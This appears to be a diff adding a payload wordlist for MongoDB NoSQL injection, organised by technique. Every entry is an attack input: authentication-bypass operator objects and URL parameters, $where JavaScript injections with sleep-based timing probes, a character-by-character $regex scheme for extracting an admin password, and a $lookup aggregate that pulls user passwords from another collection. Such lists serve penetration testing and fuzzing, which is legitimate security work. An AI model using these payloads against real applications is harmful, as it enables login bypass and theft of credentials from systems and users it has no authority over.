@@ -1,0 +1,56 @@
+# ============================================================
+# NoSQL Injection — MongoDB
+# ============================================================
+
+# ---- Authentication Bypass ----
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+{"username": {"$exists": true}, "password": {"$exists": true}}
+{"username": "admin", "password": {"$ne": null}}
+{"username": "admin", "password": {"$gt": ""}}
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+{"username": "admin", "password": {"$regex": ".*"}}
+
+# ---- URL Parameter Injection ----
+username[$ne]=invalid&password[$ne]=invalid
+username[$gt]=&password[$gt]=
+username[$exists]=true&password[$exists]=true
+username[$regex]=.*&password[$regex]=.*
+username=admin&password[$ne]=wrongpassword
+
+# ---- JSON Body Injection ----
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+{"$where": "function() { return true; }"}
+{"$where": "this.username == 'admin'"}
+
+# ---- Operator Injection ----
+{"$gt": ""}
+{"$gte": ""}
+{"$lt": "~"}
+{"$lte": "~"}
+{"$ne": null}
+{"$ne": ""}
+{"$in": [null, "admin", ""]}
+{"$nin": ["nonexistent"]}
+{"$exists": true}
+{"$regex": ".*"}
+{"$regex": "^admin"}
+
+# ---- Blind Extraction via $regex ----
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+{"username": "admin", "password": {"$regex": "^abc"}}
+# Iterate until no match
+
+# ---- $where JavaScript Injection ----
+{"$where": "this.username == 'admin' && this.password.length > 5"}
+{"$where": "function(){ var x = this.password; if(x[0] == 'a') return true; }"}
+
+# ---- Time-Based Blind ----
+{"$where": "function() { sleep(5000); return true; }"}
+{"$where": "if(this.username=='admin'){sleep(5000)}"}
+
+# ---- Aggregate Injection ----
+# Via $lookup, $graphLookup to reach other collections
+[{"$lookup": {"from": "users", "localField": "id", "foreignField": "_id", "as": "u"}}, {"$project": {"u.password": 1}}]
